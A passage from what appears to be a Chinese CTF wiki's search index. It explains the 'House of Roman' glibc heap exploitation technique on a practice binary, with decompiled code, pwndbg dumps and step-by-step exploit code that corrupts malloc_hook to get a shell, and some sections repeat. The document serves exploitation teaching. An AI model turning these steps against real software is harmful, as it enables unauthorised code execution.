ALSR\uff0c\u5229\u752812-bit \u7684\u7206\u7834\u6765\u8fbe\u5230\u83b7\u53d6shell\u7684\u76ee\u7684\u3002\u4e14\u4ec5\u4ec5\u53ea\u9700\u8981\u4e00\u4e2a UAF \u6f0f\u6d1e\u4ee5\u53ca\u80fd\u521b\u5efa\u4efb\u610f\u5927\u5c0f\u7684 chunk \u7684\u60c5\u51b5\u4e0b\u5c31\u80fd\u5b8c\u6210\u5229\u7528\u3002 \u539f\u7406\u4ee5\u53ca\u5c55\u793a \u00b6 \u4f5c\u8005\u63d0\u4f9b\u7ed9\u4e86\u6211\u4eec\u4e00\u4e2a demo \u7528\u4e8e\u5c55\u793a\uff0c\u6574\u4e2a\u5229\u7528\u8fc7\u7a0b\u5927\u6982\u53ef\u4ee5\u5206\u4e3a\u4e09\u6b65\u9aa4\u3002 \u5c06 FD \u6307\u5411 malloc_hook \u4fee\u6b63 0x71 \u7684 Freelist \u5f80 malloc_hook \u5199\u5165 one gadget \u5148\u5bf9 demo \u8fdb\u884c\u4e00\u4e2a\u5927\u81f4\u7684\u5206\u6790\uff1a \u5f00\u542f\u7684\u4fdd\u62a4\u60c5\u51b5\uff1a [ * ] '/media/psf/Home/Desktop/MyCTF/House-Of-Roman/new_chall' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled \u6837\u9898\u4e2d\u6709\u4e09\u4e2a\u4e3b\u8981\u529f\u80fd\uff0cMalloc \uff0cWrite\uff0c\u4ee5\u53ca Free\u3002 switch ( v4 ) { case 1 : puts ( \"Malloc\" ); v5 = malloc_chunk ( \"Malloc\" ); if ( ! v5 ) puts ( \"Error\" ); break ; case 2 : puts ( \"Write\" ); write_chunk ( \"Write\" ); break ; case 3 : puts ( \"Free\" ); free_chunk (); break ; default : puts ( \"Invalid choice\" ); break ; \u5728 Free \u529f\u80fd\u4e2d\u5b58\u5728 \u6307\u9488\u672a\u7f6e\u96f6\u800c\u9020\u6210\u7684\u60ac\u6302\u6307\u9488\u3002 void free_chunk () { unsigned int v0 ; // [rsp+Ch] [rbp-4h]@1 printf ( \" \\n Enter index :\" ); __isoc99_scanf ( \"%d\" , & v0 ); if ( v0 <= 0x13 ) free ( heap_ptrs [( unsigned __int64 ) v0 ]); } \u7b2c\u4e00\u6b65 \u00b6 \u9996\u5148\u4f2a\u9020\u4e00\u4e2a chunk \uff0cchunk\u7684\u5927\u5c0f\u4e3a0x61\u3002\u7d27\u63a5\u7740\u6211\u4eec\u5229\u7528 partial overwrite \u5c06 FD \u6307\u5411\u4f2a\u9020\u7684chunk\uff08\u5f53\u7136\uff0c\u8fd9\u91cc\u6211\u4eec\u4e5f\u53ef\u4ee5\u7528 UAF \u5b8c\u6210\uff09\u3002 \u4f2a\u9020 chunk size pwndbg> 0x555555757050: 0x41414141 0x41414141 0x41414141 0x41414141 0x555555757060: 0x41414141 0x41414141 0x41414141 0x41414141 0x555555757070: 0x41414141 0x41414141 0x41414141 0x41414141 0x555555757080: 0x41414141 0x41414141 0x41414141 0x41414141 0x555555757090: 0x41414141 0x41414141 0x61 0x0 <---------- \u8fd9\u91cc\uff0c\u6211\u4eec free \u6389 chunk 1\uff0c\u8fd9\u4e2a\u65f6\u5019\u6211\u4eec\u80fd\u83b7\u5f97\u4e00\u4e2a unsortbin 0x555555757020 PREV_INUSE { prev_size = 0x0, size = 0xd1, fd = 0x7ffff7dd1b58 <main_arena+88>, bk = 0x7ffff7dd1b58 <main_arena+88>, fd_nextsize = 0x4141414141414141, bk_nextsize = 0x4141414141414141 } \u63a5\u7740\uff0c\u6211\u4eec\u91cd\u5206\u914d 0xd1 \u8fd9\u5757 chunk\uff0c\u4ee5\u53ca\u4fee\u6539\u5176 size \u4e3a0x71 pwndbg> x/40ag 0x555555757020 0x555555757020: 0x4141414141414141 0x71 0x555555757030: 0x7ffff7dd1b58 <main_arena+88> 0x7ffff7dd1b58 <main_arena+88> 0x555555757040: 0x4141414141414141 0x4141414141414141 0x555555757050: 0x4141414141414141 0x4141414141414141 0x555555757060: 0x4141414141414141 0x4141414141414141 0x555555757070: 0x4141414141414141 0x4141414141414141 0x555555757080: 0x4141414141414141 0x4141414141414141 0x555555757090: 0x4141414141414141 0x61 \u6211\u4eec\u7d27\u63a5\u7740\u9700\u8981\u4fee\u6b63\u8fd90x71 FD freelist \uff0c\u5c06\u5176\u4f2a\u9020\u6210\u5df2\u7ecf\u91ca\u653e\u7684\u5757 pwndbg> x/40ag 0x555555757000 0x555555757000: 0x0 0x21 0x555555757010: 0x4141414141414141 0x4141414141414141 0x555555757020: 0x4141414141414141 0x71 <---------- free 0x71 0x555555757030: 0x7ffff7dd1b58 <main_arena+88> 0x7ffff7dd1b58 <main_arena+88> 0x555555757040: 0x4141414141414141 0x4141414141414141 0x555555757050: 0x4141414141414141 0x4141414141414141 0x555555757060: 0x4141414141414141 0x4141414141414141 0x555555757070: 0x4141414141414141 0x4141414141414141 0x555555757080: 0x4141414141414141 0x4141414141414141 0x555555757090: 0x4141414141414141 0x61 0x5555557570a0: 0x0 0x0 0x5555557570b0: 0x0 0x0 0x5555557570c0: 0x0 0x0 0x5555557570d0: 0x0 0x0 0x5555557570e0: 0x0 0x0 0x5555557570f0: 0xd0 0x71 <---------- free 0x71 0x555555757100: 0x0 0x0 0x555555757110: 0x0 0x0 0x555555757120: 0x0 0x0 0x555555757130: 0x0 0x0 libc : 0x7ffff7a23d28 (\"malloc_hook\") \u8fd9\u4e2a\u65f6\u5019\u6211\u4eec\u7684 FD \u5df2\u7ecf\u5728 malloc hook \u9644\u8fd1\uff0c\u672a\u4e4b\u540e\u7684\u7206\u7834\u505a\u51c6\u5907\u3002 \u7b2c\u4e8c\u6b65 \u00b6 \u6211\u4eec\u53ea\u9700\u8981\u901a\u8fc7 \u91ca\u653e\u4e00\u57570x71\u5927\u5c0f\u7684 chunk \u5c31\u80fd\u5b8c\u6210 fix\u3002 \u7b2c\u4e09\u6b65 \u00b6 \u5229\u7528 unsortebin \u7684\u653b\u51fb\u6280\u5de7\uff0c\u5e76\u4f7f\u7528\u7f16\u8f91\u529f\u80fd\u5c06 onegadet \u5199\u5165 \u3002 \u5206\u6790 exp \u00b6 \u5206\u914d 3 \u4e2a chunk \uff0c\u5728 B + 0x78 \u5904\u8bbe\u7f6e p64(0x61) \uff0c \u4f5c\u7528\u662f fake size ,\u7528\u4e8e\u540e\u9762 \u7684 fastbin attack create ( 0x18 , 0 ) # 0x20 create ( 0xc8 , 1 ) # d0 create ( 0x65 , 2 ) # 0x70 info ( \"create 2 chunk, 0x20, 0xd8\" ) fake = \"A\" * 0x68 fake += p64 ( 0x61 ) ## fake size edit ( 1 , fake ) info ( \"fake\" ) \u91ca\u653e\u6389 B , \u7136\u540e\u5206\u914d\u540c\u6837\u5927\u5c0f\u518d\u6b21\u5206\u914d\u5230 B , \u6b64\u65f6 B+0x10 \u548c B+0x18 \u4e2d\u6709 main_arean \u7684\u5730\u5740\u3002\u5206\u914d 3 \u4e2a fastbin \uff0c\u5229\u7528 off by one \u4fee\u6539 B->size = 0x71 free(1) create(0xc8,1) create(0x65,3) # b create(0x65,15) create(0x65,18) over = \"A\"*0x18 # off by one over += \"\\x71\" # set chunk 1's size --> 0x71 edit(0,over) info(\"\u5229\u7528 off by one , chunk 1's size --> 0x71\") \u751f\u6210\u4e24\u4e2a fastbin \uff0c\u7136\u540e\u5229\u7528 uaf \uff0c\u90e8\u5206\u5730\u5740\u5199\uff0c\u628a B \u94fe\u5165\u5230 fastbin free ( 2 ) free ( 3 ) info ( \"\u521b\u5efa\u4e24\u4e2a 0x70 \u7684 fastbin\" ) heap_po = \" \\x20 \" edit ( 3 , heap_po ) info ( \"\u628a chunk'1 \u94fe\u5165\u5230 fastbin \u91cc\u9762\" ) \u8c03\u8bd5\u770b\u770b\u6b64\u65f6 fastbin \u7684\u72b6\u6001 pwndbg> fastbins fastbins 0x20: 0x0 0x30: 0x0 0x40: 0x0 0x50: 0x0 0x60: 0x0 0x70: 0x555555757160 \u2014\u25b8 0x555555757020 \u2014\u25b8 0x7ffff7dd1b78 (main_arena+88) \u25c2\u2014 0x7ffff7dd1b78 0x80: 0x0 0x555555757020 \u5c31\u662f chunk B \u7136\u540e\u901a\u8fc7\u4fee\u6539 B->fd \u7684\u4f4e 2 \u5b57\u8282\uff0c \u4f7f\u5f97 B->fd= malloc_hook - 0x23 # malloc_hook \u4e0a\u65b9 malloc_hook_nearly = \"\\xed\\x1a\" edit(1,malloc_hook_nearly) info(\"\u90e8\u5206\u5199\uff0c\u4fee\u6539 fastbin->fd ---> malloc_hook\") \u7136\u540e\u5206\u914d 3 \u4e2a 0x70 \u7684 chunk \uff0c\u5c31\u53ef\u4ee5\u62ff\u5230 malloc_hook \u6240\u5728\u7684\u90a3\u4e2a chunk . create(0x65,0) create(0x65,0) create(0x65,0) \u7136\u540e free \u6389 E \uff0c\u8fdb\u5165 fastbin \uff0c\u5229\u7528 uaf \u8bbe\u7f6e E->fd = 0 \uff0c \u4fee\u590d\u4e86 fastbin free(15) edit(15,p64(0x00)) info(\"\u518d\u6b21\u751f\u6210 0x71 \u7684 fastbin, \u540c\u65f6\u4fee\u6539 fd =0, \u4fee\u590d fastbin\") \u7136\u540e\u662f unsorted bin \u653b\u51fb\uff0c\u4f7f\u5f97 malloc_hook \u7684\u503c\u4e3a main_arena+88 create(0xc8,1) create(0xc8,1) create(0x18,2) create(0xc8,3) create(0xc8,4) free(1) po = \"B\"*8 po += \"\\x00\\x1b\" edit(1,po) create(0xc8,1) info(\"unsorted bin \u4f7f\u5f97 malloc_hook \u6709 libc \u7684\u5730\u5740\") \u5229\u7528 \u4fee\u6539 malloc_hook \u7684\u4f4e\u4e09\u4e2a\u5b57\u8282 \uff0c\u4f7f\u5f97 malloc_hook \u4e3a one_gadget \u7684\u5730\u5740 over = \"R\"*0x13 # padding for malloc_hook over += \"\\xa4\\xd2\\xaf\" edit(0,over) info(\"malloc_hook to one_gadget\") \u7136\u540e free \u4e24\u6b21\u540c\u4e00\u4e2a chunk \uff0c\u89e6\u53d1 malloc_printerr \uff0c getshell free(18) free(18) link \u00b6 https://gist.github.com/romanking98/9aab2804832c0fb46615f025e8ffb0bc https://github.com/romanking98/House-Of-Roman https://xz.aliyun.com/t/2316","title":"House of Roman"},{"location":"pwn/heap/house_of_roman/#house-of-roman","text":"","title":"House of Roman"},{"location":"pwn/heap/house_of_roman/#_1","text":"House of Roman \u8fd9\u4e2a\u6280\u5de7\u8bf4\u7b80\u5355\u70b9\u5176\u5b9e\u5c31\u662f fastbin attack \u548c Unsortbin attachk \u7ed3\u5408\u7684\u4e00\u4e2a\u5c0f trick\u3002","title":"\u4ecb\u7ecd"},{"location":"pwn/heap/house_of_roman/#_2","text":"\u8be5\u6280\u672f\u7528\u4e8e bypass ALSR\uff0c\u5229\u752812-bit \u7684\u7206\u7834\u6765\u8fbe\u5230\u83b7\u53d6shell\u7684\u76ee\u7684\u3002\u4e14\u4ec5\u4ec5\u53ea\u9700\u8981\u4e00\u4e2a UAF \u6f0f\u6d1e\u4ee5\u53ca\u80fd\u521b\u5efa\u4efb\u610f\u5927\u5c0f\u7684 chunk \u7684\u60c5\u51b5\u4e0b\u5c31\u80fd\u5b8c\u6210\u5229\u7528\u3002","title":"\u6982\u62ec"},{"location":"pwn/heap/house_of_roman/#_3","text":"\u4f5c\u8005\u63d0\u4f9b\u7ed9\u4e86\u6211\u4eec\u4e00\u4e2a demo \u7528\u4e8e\u5c55\u793a\uff0c\u6574\u4e2a\u5229\u7528\u8fc7\u7a0b\u5927\u6982\u53ef\u4ee5\u5206\u4e3a\u4e09\u6b65\u9aa4\u3002 \u5c06 FD \u6307\u5411 malloc_hook \u4fee\u6b63 0x71 \u7684 Freelist \u5f80 malloc_hook \u5199\u5165 one gadget \u5148\u5bf9 demo \u8fdb\u884c\u4e00\u4e2a\u5927\u81f4\u7684\u5206\u6790\uff1a \u5f00\u542f\u7684\u4fdd\u62a4\u60c5\u51b5\uff1a [ * ] '/media/psf/Home/Desktop/MyCTF/House-Of-Roman/new_chall' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled \u6837\u9898\u4e2d\u6709\u4e09\u4e2a\u4e3b\u8981\u529f\u80fd\uff0cMalloc \uff0cWrite\uff0c\u4ee5\u53ca Free\u3002 switch ( v4 ) { case 1 : puts ( \"Malloc\" ); v5 = malloc_chunk ( \"Malloc\" ); if ( ! v5 ) puts ( \"Error\" ); break ; case 2 : puts ( \"Write\" ); write_chunk ( \"Write\" ); break ; case 3 : puts ( \"Free\" ); free_chunk (); break ; default : puts ( \"Invalid choice\" ); break ; \u5728 Free \u529f\u80fd\u4e2d\u5b58\u5728 \u6307\u9488\u672a\u7f6e\u96f6\u800c\u9020\u6210\u7684\u60ac\u6302\u6307\u9488\u3002 void free_chunk () { unsigned int v0 ; // [rsp+Ch] [rbp-4h]@1 printf ( \" \\n Enter index :\" ); __isoc99_scanf ( \"%d\" , & v0 ); if ( v0 <= 0x13 ) free ( heap_ptrs [( unsigned __int64 ) v0 ]); }","title":"\u539f\u7406\u4ee5\u53ca\u5c55\u793a"},{"location":"pwn/heap/house_of_roman/#_4","text":"\u9996\u5148\u4f2a\u9020\u4e00\u4e2a chunk \uff0cchunk\u7684\u5927\u5c0f\u4e3a0x61\u3002\u7d27\u63a5\u7740\u6211\u4eec\u5229\u7528 partial overwrite \u5c06 FD \u6307\u5411\u4f2a\u9020\u7684chunk\uff08\u5f53\u7136\uff0c\u8fd9\u91cc\u6211\u4eec\u4e5f\u53ef\u4ee5\u7528 UAF \u5b8c\u6210\uff09\u3002 \u4f2a\u9020 chunk size pwndbg> 0x555555757050: 0x41414141 0x41414141 0x41414141 0x41414141 0x555555757060: 0x41414141 0x41414141 0x41414141 0x41414141 0x555555757070: 0x41414141 0x41414141 0x41414141 0x41414141 0x555555757080: 0x41414141 0x41414141 0x41414141 0x41414141 0x555555757090: 0x41414141 0x41414141 0x61 0x0 <---------- \u8fd9\u91cc\uff0c\u6211\u4eec free \u6389 chunk 1\uff0c\u8fd9\u4e2a\u65f6\u5019\u6211\u4eec\u80fd\u83b7\u5f97\u4e00\u4e2a unsortbin 0x555555757020 PREV_INUSE { prev_size = 0x0, size = 0xd1, fd = 0x7ffff7dd1b58 <main_arena+88>, bk = 0x7ffff7dd1b58 <main_arena+88>, fd_nextsize = 0x4141414141414141, bk_nextsize = 0x4141414141414141 } \u63a5\u7740\uff0c\u6211\u4eec\u91cd\u5206\u914d 0xd1 \u8fd9\u5757 chunk\uff0c\u4ee5\u53ca\u4fee\u6539\u5176 size \u4e3a0x71 pwndbg> x/40ag 0x555555757020 0x555555757020: 0x4141414141414141 0x71 0x555555757030: 0x7ffff7dd1b58 <main_arena+88> 0x7ffff7dd1b58 <main_arena+88> 0x555555757040: 0x4141414141414141 0x4141414141414141 0x555555757050: 0x4141414141414141 0x4141414141414141 0x555555757060: 0x4141414141414141 0x4141414141414141 0x555555757070: 0x4141414141414141 0x4141414141414141 0x555555757080: 0x4141414141414141 0x4141414141414141 0x555555757090: 0x4141414141414141 0x61 \u6211\u4eec\u7d27\u63a5\u7740\u9700\u8981\u4fee\u6b63\u8fd90x71 FD freelist \uff0c\u5c06\u5176\u4f2a\u9020\u6210\u5df2\u7ecf\u91ca\u653e\u7684\u5757 pwndbg> x/40ag 0x555555757000 0x555555757000: 0x0 0x21 0x555555757010: 0x4141414141414141 0x4141414141414141 0x555555757020: 0x4141414141414141 0x71 <---------- free 0x71 0x555555757030: 0x7ffff7dd1b58 <main_arena+88> 0x7ffff7dd1b58 <main_arena+88> 0x555555757040: 0x4141414141414141 0x4141414141414141 0x555555757050: 0x4141414141414141 0x4141414141414141 0x555555757060: 0x4141414141414141 0x4141414141414141 0x555555757070: 0x4141414141414141 0x4141414141414141 0x555555757080: 0x4141414141414141 0x4141414141414141 0x555555757090: 0x4141414141414141 0x61 0x5555557570a0: 0x0 0x0 0x5555557570b0: 0x0 0x0 0x5555557570c0: 0x0 0x0 0x5555557570d0: 0x0 0x0 0x5555557570e0: 0x0 0x0 0x5555557570f0: 0xd0 0x71 <---------- free 0x71 0x555555757100: 0x0 0x0 0x555555757110: 0x0 0x0 0x555555757120: 0x0 0x0 0x555555757130: 0x0 0x0 libc : 0x7ffff7a23d28 (\"malloc_hook\") \u8fd9\u4e2a\u65f6\u5019\u6211\u4eec\u7684 FD \u5df2\u7ecf\u5728 malloc hook \u9644\u8fd1\uff0c\u672a\u4e4b\u540e\u7684\u7206\u7834\u505a\u51c6\u5907\u3002","title":"\u7b2c\u4e00\u6b65"},{"location":"pwn/heap/house_of_roman/#_5","text":"\u6211\u4eec\u53ea\u9700\u8981\u901a\u8fc7 \u91ca\u653e\u4e00\u57570x71\u5927\u5c0f\u7684 chunk \u5c31\u80fd\u5b8c\u6210 fix\u3002","title":"\u7b2c\u4e8c\u6b65"},{"location":"pwn/heap/house_of_roman/#_6","text":"\u5229\u7528 unsortebin \u7684\u653b\u51fb\u6280\u5de7\uff0c\u5e76\u4f7f\u7528\u7f16\u8f91\u529f\u80fd\u5c06 onegadet \u5199\u5165 \u3002","title":"\u7b2c\u4e09\u6b65"},{"location":"pwn/heap/house_of_roman/#exp","text":"\u5206\u914d 3 \u4e2a chunk \uff0c\u5728 B + 0x78 \u5904\u8bbe\u7f6e p64(0x61) \uff0c \u4f5c\u7528\u662f fake size ,\u7528\u4e8e\u540e\u9762 \u7684 fastbin attack create ( 0x18 , 0 ) # 0x20 create ( 0xc8 , 1 ) # d0 create ( 0x65 , 2 ) # 0x70 info ( \"create 2 chunk, 0x20, 0xd8\" ) fake = \"A\" * 0x68 fake += p64 ( 0x61 ) ## fake size edit ( 1 , fake ) info ( \"fake\" ) \u91ca\u653e\u6389 B , \u7136\u540e\u5206\u914d\u540c\u6837\u5927\u5c0f\u518d\u6b21\u5206\u914d\u5230 B , \u6b64\u65f6 B+0x10 \u548c B+0x18 \u4e2d\u6709 main_arean \u7684\u5730\u5740\u3002\u5206\u914d 3 \u4e2a fastbin \uff0c\u5229\u7528 off by one \u4fee\u6539 B->size = 0x71 free(1) create(0xc8,1) create(0x65,3) # b create(0x65,15) create(0x65,18) over = \"A\"*0x18 # off by one over += \"\\x71\" # set chunk 1's size --> 0x71 edit(0,over) info(\"\u5229\u7528 off by one , chunk 1's size --> 0x71\") \u751f\u6210\u4e24\u4e2a fastbin \uff0c\u7136\u540e\u5229\u7528 uaf \uff0c\u90e8\u5206\u5730\u5740\u5199\uff0c\u628a B \u94fe\u5165\u5230 fastbin free ( 2 ) free ( 3 ) info ( \"\u521b\u5efa\u4e24\u4e2a 0x70 \u7684 fastbin\" ) heap_po = \" \\x20 \" edit ( 3 , heap_po ) info ( \"\u628a chunk'1 \u94fe\u5165\u5230 fastbin \u91cc\u9762\" ) \u8c03\u8bd5\u770b\u770b\u6b64\u65f6 fastbin \u7684\u72b6\u6001 pwndbg> fastbins fastbins 0x20: 0x0 0x30: 0x0 0x40: 0x0 0x50: 0x0 0x60: 0x0 0x70: 0x555555757160 \u2014\u25b8 0x555555757020 \u2014\u25b8 0x7ffff7dd1b78 (main_arena+88) \u25c2\u2014 0x7ffff7dd1b78 0x80: 0x0 0x555555757020 \u5c31\u662f chunk B \u7136\u540e\u901a\u8fc7\u4fee\u6539 B->fd \u7684\u4f4e 2 \u5b57\u8282\uff0c \u4f7f\u5f97 B->fd= malloc_hook - 0x23 # malloc_hook \u4e0a\u65b9 malloc_hook_nearly = \"\\xed\\x1a\" edit(1,malloc_hook_nearly) info(\"\u90e8\u5206\u5199\uff0c\u4fee\u6539 fastbin->fd ---> malloc_hook\") \u7136\u540e\u5206\u914d 3 \u4e2a 0x70 \u7684 chunk \uff0c\u5c31\u53ef\u4ee5\u62ff\u5230 malloc_hook \u6240\u5728\u7684\u90a3\u4e2a chunk . create(0x65,0) create(0x65,0) create(0x65,0) \u7136\u540e free \u6389 E \uff0c\u8fdb\u5165 fastbin \uff0c\u5229\u7528 uaf \u8bbe\u7f6e E->fd = 0 \uff0c \u4fee\u590d\u4e86 fastbin free(15) edit(15,p64(0x00)) info(\"\u518d\u6b21\u751f\u6210 0x71 \u7684 fastbin, \u540c\u65f6\u4fee\u6539 fd =0, \u4fee\u590d fastbin\") \u7136\u540e\u662f unsorted bin \u653b\u51fb\uff0c\u4f7f\u5f97 malloc_hook \u7684\u503c\u4e3a main_arena+88 create(0xc8,1) create(0xc8,1) create(0x18,2) create(0xc8,3) create(0xc8,4) free(1) po = \"B\"*8 po += \"\\x00\\x1b\" edit(1,po) create(0xc8,1) info(\"unsorted bin \u4f7f\u5f97 malloc_hook \u6709 libc \u7684\u5730\u5740\") \u5229\u7528 \u4fee\u6539 malloc_hook \u7684\u4f4e\u4e09\u4e2a\u5b57\u8282 \uff0c\u4f7f\u5f97 malloc_hook \u4e3a one_gadget \u7684\u5730\u5740 over = \"R\"*0x13 # padding for malloc_hook over += \"\\xa4\\xd2\\xaf\" edit(0,over) info(\"malloc_hook to one_gadget\") \u7136\u540e free \u4e24\u6b21\u540c\u4e00\u4e2a chunk \uff0c\u89e6\u53d1 malloc_printerr \uff0c getshell free(18) free(18)","title":"\u5206\u6790 exp"},{"location":"pwn/heap/house_of_roman/#link","text":"https://gist.github.com/romanking98/9aab2804832c0fb46615f025e8ffb0bc https://github.com/romanking98/House-Of-Roman https://xz.aliyun.com/t/2316","title":"link"},{"location":"pwn/heap/introduction/","text":"\u5806\u5229\u7528 \u00b6 \u5728\u8be5\u7ae0\u8282\u4e2d\uff0c\u6211\u4eec\u4f1a\u6309\u7167\u5982\u4e0b\u7684\u6b65\u9aa4\u8fdb\u884c\u4ecb\u7ecd \u4ecb\u7ecd\u6211\u4eec\u6240\u719f\u77e5\u7684\u52a8\u6001\u5185\u5b58\u5206\u914d\u7684\u5806\u7684\u5b8f\u89c2\u64cd\u4f5c \u4ecb\u7ecd\u4e3a\u4e86\u8fbe\u5230\u8fd9\u4e9b\u64cd\u4f5c\u6240\u4f7f\u7528\u7684\u6570\u636e\u7ed3\u6784 \u4ecb\u7ecd\u5229\u7528\u8fd9\u4e9b\u6570\u636e\u7ed3\u6784\u5b9e\u73b0\u5806\u7684\u5206\u914d\u4e0e\u56de\u6536\u7684\u5177\u4f53\u64cd\u4f5c \u7531\u6d45\u5165\u6df1\u5730\u4ecb\u7ecd\u5806\u7684\u5404\u79cd\u5229\u7528\u6280\u5de7\u3002 \u5bf9\u4e8e\u4e0d\u540c\u7684\u5e94\u7528\u6765\u8bf4\uff0c\u7531\u4e8e\u5185\u5b58\u7684\u9700\u6c42\u5404\u4e0d\u76f8\u540c\u7b49\u7279\u6027\uff0c\u56e0\u6b64\u76ee\u524d\u5806\u7684\u5b9e\u73b0\u6709\u5f88\u591a\u79cd\uff0c\u5177\u4f53\u5982\u4e0b dlmalloc \u2013 General purpose allocator ptmalloc2 \u2013 glibc jemalloc \u2013 FreeBSD and Firefox tcmalloc \u2013 Google libumem \u2013 Solaris \u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u4ee5 glibc \u4e2d\u5806\u7684\u5b9e\u73b0\u4e3a\u4e3b\u8fdb\u884c\u4ecb\u7ecd\u3002\u5982\u679c\u540e\u7eed\u6709\u65f6\u95f4\uff0c\u4f1a\u7ee7\u7eed\u4ecb\u7ecd\u5176\u5b83\u5806\u7684\u5b9e\u73b0\u53ca\u5176\u5229\u7528\u3002 \u8be5\u90e8\u5206\u4e3b\u8981\u53c2\u8003\u7684\u8d44\u6599\u5982\u4e0b\uff0c\u6587\u4e2d\u6709\u5f88\u591a\u5185\u5bb9\u4f1a\u548c\u53c2\u8003\u8d44\u6599\u4e2d\u4e00\u81f4\uff0c\u4ee5\u540e\u5c31\u4e0d\u4e00\u4e00\u8bf4\u660e\u4e86\u3002 black hat heap exploitation github heap exploition sploitfun glibc \u6e90\u7801 \u66f4\u591a\u7684\u53c2\u8003\u6587\u732e\u8bf7\u770bref\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6","title":"\u5806\u5229\u7528\u7b80\u4ecb"},{"location":"pwn/heap/introduction/#_1","text":"\u5728\u8be5\u7ae0\u8282\u4e2d\uff0c\u6211\u4eec\u4f1a\u6309\u7167\u5982\u4e0b\u7684\u6b65\u9aa4\u8fdb\u884c\u4ecb\u7ecd \u4ecb\u7ecd\u6211\u4eec\u6240\u719f\u77e5\u7684\u52a8\u6001\u5185\u5b58\u5206\u914d\u7684\u5806\u7684\u5b8f\u89c2\u64cd\u4f5c \u4ecb\u7ecd\u4e3a\u4e86\u8fbe\u5230\u8fd9\u4e9b\u64cd\u4f5c\u6240\u4f7f\u7528\u7684\u6570\u636e\u7ed3\u6784 \u4ecb\u7ecd\u5229\u7528\u8fd9\u4e9b\u6570\u636e\u7ed3\u6784\u5b9e\u73b0\u5806\u7684\u5206\u914d\u4e0e\u56de\u6536\u7684\u5177\u4f53\u64cd\u4f5c \u7531\u6d45\u5165\u6df1\u5730\u4ecb\u7ecd\u5806\u7684\u5404\u79cd\u5229\u7528\u6280\u5de7\u3002 \u5bf9\u4e8e\u4e0d\u540c\u7684\u5e94\u7528\u6765\u8bf4\uff0c\u7531\u4e8e\u5185\u5b58\u7684\u9700\u6c42\u5404\u4e0d\u76f8\u540c\u7b49\u7279\u6027\uff0c\u56e0\u6b64\u76ee\u524d\u5806\u7684\u5b9e\u73b0\u6709\u5f88\u591a\u79cd\uff0c\u5177\u4f53\u5982\u4e0b dlmalloc \u2013 General purpose allocator ptmalloc2 \u2013 glibc jemalloc \u2013 FreeBSD and Firefox tcmalloc \u2013 Google libumem \u2013 Solaris \u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u4ee5 glibc \u4e2d\u5806\u7684\u5b9e\u73b0\u4e3a\u4e3b\u8fdb\u884c\u4ecb\u7ecd\u3002\u5982\u679c\u540e\u7eed\u6709\u65f6\u95f4\uff0c\u4f1a\u7ee7\u7eed\u4ecb\u7ecd\u5176\u5b83\u5806\u7684\u5b9e\u73b0\u53ca\u5176\u5229\u7528\u3002 \u8be5\u90e8\u5206\u4e3b\u8981\u53c2\u8003\u7684\u8d44\u6599\u5982\u4e0b\uff0c\u6587\u4e2d\u6709\u5f88\u591a\u5185\u5bb9\u4f1a\u548c\u53c2\u8003\u8d44\u6599\u4e2d\u4e00\u81f4\uff0c\u4ee5\u540e\u5c31\u4e0d\u4e00\u4e00\u8bf4\u660e\u4e86\u3002 black hat heap exploitation github heap exploition sploitfun glibc \u6e90\u7801 \u66f4\u591a\u7684\u53c2\u8003\u6587\u732e\u8bf7\u770bref\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6","title":"\u5806\u5229\u7528"},{"location":"pwn/heap/leak_heap/","text":"\u901a\u8fc7\u5806\u8fdb\u884c\u4fe1\u606f\u6cc4\u6f0f \u00b6 \u4ec0\u4e48\u53eb\u4fe1\u606f\u6cc4\u6f0f \u00b6 \u5728CTF\u4e2d\uff0cPwn\u9898\u76ee\u4e00\u822c\u90fd\u662f\u8fd0\u884c\u5728\u8fdc\u7aef\u670d\u52a1\u5668\u4e0a\u7684\u3002\u56e0\u6b64\u6211\u4eec\u4e0d\u80fd\u83b7\u77e5\u670d\u52a1\u5668\u4e0a\u7684libc.so\u5730\u5740\u3001Heap\u57fa\u5730\u5740\u7b49\u5730\u5740\u4fe1\u606f\uff0c\u4f46\u662f\u5728\u8fdb\u884c\u5229\u7528\u7684\u65f6\u5019\u5f80\u5f80\u9700\u8981\u8fd9\u4e9b\u5730\u5740\uff0c\u6b64\u65f6\u5c31\u9700\u8981\u8fdb\u884c\u4fe1\u606f\u6cc4\u6f0f\u3002 \u4fe1\u606f\u6cc4\u6f0f\u7684\u76ee\u6807 \u00b6 \u4fe1\u606f\u6cc4\u6f0f\u7684\u76ee\u6807\u6709\u54ea\u4e9b\uff1f\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u89c2\u5bdf\u5185\u5b58\u7a7a\u95f4\u6765\u83b7\u77e5\u8fd9\u4e00\u70b9 Start End Offset Perm Path 0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /home/pwn 0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /home/pwn 0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /home/pwn 0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap] 0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so 0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so 0x00007ffff7dd3000 0x00007ffff7dd7000 0x0000000000000000 rw- 0x00007ffff7dd7000 0x00007ffff7dfd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.23.so 0x00007ffff7fdb000 0x00007ffff7fde000 0x0000000000000000 rw- 0x00007ffff7ff6000 0x00007ffff7ff8000 0x0000000000000000 rw- 0x00007ffff7ff8000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar] 0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso] 0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000025000 r-- /lib/x86_64-linux-gnu/ld-2.23.so 0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000026000 rw- /lib/x86_64-linux-gnu/ld-2.23.so 0x00007ffff7ffe000 